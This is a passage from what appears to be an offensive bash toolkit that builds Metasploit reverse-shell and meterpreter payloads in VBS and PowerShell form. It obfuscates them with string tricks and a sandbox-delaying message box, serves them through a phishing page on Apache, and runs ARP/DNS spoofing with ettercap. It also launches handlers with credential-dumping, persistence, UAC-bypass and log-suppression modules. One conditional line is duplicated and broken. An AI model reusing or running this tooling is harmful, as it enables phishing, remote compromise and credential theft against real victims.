mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# --------------------------------------------------------
# build shellcode in VBS (obfuscated using ANCII) 
# It was Working in 'Suryia Prakash' rat.vbs obfuscation
# that led me here... (build a vbs obfuscated payload) :D
# --------------------------------------------------------
sh_shellcode13 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ VBS NAME ☠" --text "example: Prakash" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="Prakash";fi

echo "[☠] Building shellcode -> vbs format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : VBS -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f vbs > $IPATH/obfuscate/$N4m.vbs"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f vbs > $IPATH/obfuscate/$N4m.vbs" > /dev/null 2>&1
fi


cat $IPATH/obfuscate/$N4m.vbs | grep '"' | awk {'print $3'} | cut -d '=' -f1
# obfuscating payload.vbs
echo "[☠] Obfuscating sourcecode..."
sleep 2
cd $IPATH/obfuscate/
xterm -T " VBS-OBFUSCATOR.PY " -geometry 110x23 -e "python vbs-obfuscator.py $N4m.vbs final.vbs"
cp final.vbs $IPATH/output/$N4m.vbs > /dev/null 2>&1
rm $N4m.vbs > /dev/null 2>&1
echo "[☠] Injecting shellcode -> $N4m.vbs!"
sleep 2
cd $IPATH/

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.vbs" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 180) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi

         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi
       fi


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


# ZIP payload files before sending? (apache2)
rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payload files?" --width 270) > /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      echo "[☠] creating archive -> $N4m.zip"
      zip $N4m.zip $N4m.vbs > /dev/null 2>&1
      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    else
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.vbs|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    fi

        if [ "$D0M4IN" = "YES" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# ----------------------------------------------------
# build shellcode in PSH-CMD (powershell base64 enc)
# embbebed into one .vbs template
# ----------------------------------------------------
sh_shellcode14 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: notepad" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="notepad";fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi


# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PSH-CMD -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
fi


# display shellcode
disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""
sleep 2


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay is execution to evade sandbox detection (msgbox)'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1


if [ "$OBF" = "None-Obfuscation (default)" ]; then
   # check if exec.vbs as generated
   if [ -e $IPATH/templates/exec.vbs ]; then
      echo "[☠] exec.vbs  -> found!"
      sleep 2
 
   else

      echo "[☠] exec.vbs  -> not found!"
      exit
      fi

# injecting shellcode into name
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.vbs!"
sleep 2
sed "s|InJ3C|$disp|" exec.vbs > $N4m.vbs
mv $N4m.vbs $IPATH/output/$N4m.vbs
chmod +x $IPATH/output/$N4m.vbs

else
echo "[✔] String obfuscation technic sellected .."
sleep 2
echo "[☠] Injecting shellcode -> $N4m.vbs!"
sleep 2
#
# STRING: powershell.exe -wIN 1 -noP -noNI -eN $disp
#
echo "dIm i0dIfQ,f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"/wINe\"+\"NPoW\"&\"eR1nO\"+\"PSh\"&\"ElLn\"+\"oNI\":i0dIfQ=rEpLaCe(\"In\"&\"si0al\"+\"ling up\"&\"da\"+\"i0es.\",\"i0\",\"t\"):mSgbOx i0dIfQ:f0wBiQ=mid(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" \"&mId(U1kJi0,1,4)&\" 1 \"&mId(U1kJi0,1,1)&MiD(U1kJi0,13,3)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,21,4)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,5,2)&\" $disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ" > $IPATH/output/$N4m.vbs
cd $IPATH/output
fi

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.vbs\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m.vbs" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.vbs on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.vbs|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.vbs|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.vbs|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


# ZIP payload files before sending? (apache2)
rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payload files?" --width 270) > /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      echo "[☠] creating archive -> $N4m.zip"
      zip $N4m.zip $N4m.vbs > /dev/null 2>&1
      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    else
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.vbs|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    fi


        if [ "$D0M4IN" = "YES" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ]; thenif [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
